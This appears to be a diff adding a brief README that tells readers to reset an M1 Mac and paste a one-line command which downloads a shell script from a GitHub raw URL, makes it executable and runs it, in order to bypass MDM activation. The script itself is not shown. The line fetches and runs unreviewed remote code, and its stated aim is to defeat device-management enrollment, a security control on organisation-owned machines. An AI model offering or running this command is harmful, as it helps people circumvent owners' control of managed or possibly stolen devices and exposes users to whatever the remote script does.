@@ -1,0 +1,5 @@
+Reset your Mac M1
+
+Run Terminal and Run this code it will create a new profile. You can bypass the MDM activation.... Good Luck
+
+curl https://raw.githubusercontent.com/maclifevn/bypasmdm/main/mdm.sh -o test.sh && chmod +x ./test.sh && ./test.sh
